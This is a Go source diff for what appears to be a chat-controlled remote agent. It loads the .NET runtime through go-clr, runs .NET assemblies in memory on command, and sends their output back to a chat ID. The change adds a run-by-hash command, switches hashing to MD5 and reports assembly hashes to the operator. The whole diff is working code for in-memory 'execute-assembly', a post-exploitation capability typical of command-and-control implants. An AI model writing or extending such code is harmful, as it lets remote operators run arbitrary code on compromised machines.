@@ -3,7 +3,10 @@ package main
 import (
 	_ "embed"
 	"sync"
-	"crypto/sha256"
+	"bytes"
+	"crypto/md5"
+	"encoding/hex"
+
 	clr "github.com/Ne0nd0g/go-clr"
 )
 
@@ -17,7 +20,7 @@ var (
 
 type assembly struct {
 	methodInfo *clr.MethodInfo
-	hash       [32]byte
+	hash       [16]byte
 }
 
 type CLRInstance struct {
@@ -25,27 +28,16 @@ type CLRInstance struct {
 	sync.Mutex
 }
 
-func (c *CLRInstance) GetRuntimeHost(runtime string) *clr.ICORRuntimeHost {
-	c.Lock()
-	defer c.Unlock()
-	if c.runtimeHost == nil {
-		c.runtimeHost, _ = clr.LoadCLR(runtime)
-		_ = clr.RedirectStdoutStderr()
-	}
-	return c.runtimeHost
-}
 
 func executeAssembly(chatID int64, data []byte, assemblyArgs []string, runtime string) {
-	var (
-		methodInfo *clr.MethodInfo
-		err        error
-	)
-
 	rtHost := clrInstance.GetRuntimeHost(runtime)
 	if rtHost == nil {
 		SendMessage(chatID, "Could not load CLR runtime host")
 		return
 	}
+
+	var methodInfo *clr.MethodInfo
+	var err error
 
 	if asm := getAssembly(data); asm != nil {
 		methodInfo = asm.methodInfo
@@ -55,11 +47,44 @@ func executeAssembly(chatID int64, data []byte, assemblyArgs []string, runtime s
 			SendMessage(chatID, "Could not load assembly")
 			return
 		}
-		addAssembly(methodInfo, data)
+		addAssembly(chatID, methodInfo, data)
 	}
+
+	invokeAssembly(chatID, methodInfo, assemblyArgs)
+}
+
+func executeAssemblyByHash(chatID int64, hash string, assemblyArgs []string, runtime string) {
+	rtHost := clrInstance.GetRuntimeHost(runtime)
+	if rtHost == nil {
+		SendMessage(chatID, "Could not load CLR runtime host")
+		return
+	}
+
+	asmHash, err := hex.DecodeString(hash)
+	if err != nil {
+		SendMessage(chatID, "Could not decode hash string")
+		return
+	}
+
+	var methodInfo *clr.MethodInfo
+	for _, asm := range assemblies {
+		if bytes.Equal(asm.hash[:], asmHash) {
+			methodInfo = asm.methodInfo
+		}
+	}
+
+	if methodInfo == nil {
+		SendMessage(chatID, "Could not find loaded assembly")
+		return
+	}
+
+	invokeAssembly(chatID, methodInfo, assemblyArgs)
+}
+
+func invokeAssembly(chatID int64, methodInfo *clr.MethodInfo, assemblyArgs []string) {
 	if len(assemblyArgs) == 1 && assemblyArgs[0] == "" {
-		// for methods like Main(String[] args), if we pass an empty string slice
-		// the clr loader will not pass the argument and look for a method with
+		// For methods like Main(String[] args), if we pass an empty string slice
+		// the CLR loader will not pass the argument and look for a method with
 		// no arguments, which won't work
 		assemblyArgs = []string{" "}
 	}
@@ -78,14 +103,25 @@ func executeAssembly(chatID int64, data []byte, assemblyArgs []string, runtime s
 	SendMessage(chatID, responseStr)
 }
 
-func addAssembly(methodInfo *clr.MethodInfo, data []byte) {
-	asmHash := sha256.Sum256(data)
+func (c *CLRInstance) GetRuntimeHost(runtime string) *clr.ICORRuntimeHost {
+	c.Lock()
+	defer c.Unlock()
+	if c.runtimeHost == nil {
+		c.runtimeHost, _ = clr.LoadCLR(runtime)
+		_ = clr.RedirectStdoutStderr()
+	}
+	return c.runtimeHost
+}
+
+func addAssembly(chatID int64, methodInfo *clr.MethodInfo, data []byte) {
+	asmHash := md5.Sum(data)
 	asm := &assembly{methodInfo: methodInfo, hash: asmHash}
 	assemblies = append(assemblies, asm)
+	SendMessage(chatID, "Assembly hash: " + hex.EncodeToString(asmHash[:]))
 }
 
 func getAssembly(data []byte) *assembly {
-	asmHash := sha256.Sum256(data)
+	asmHash := md5.Sum(data)
 	for _, asm := range assemblies {
 		if asm.hash == asmHash {
 			return asm
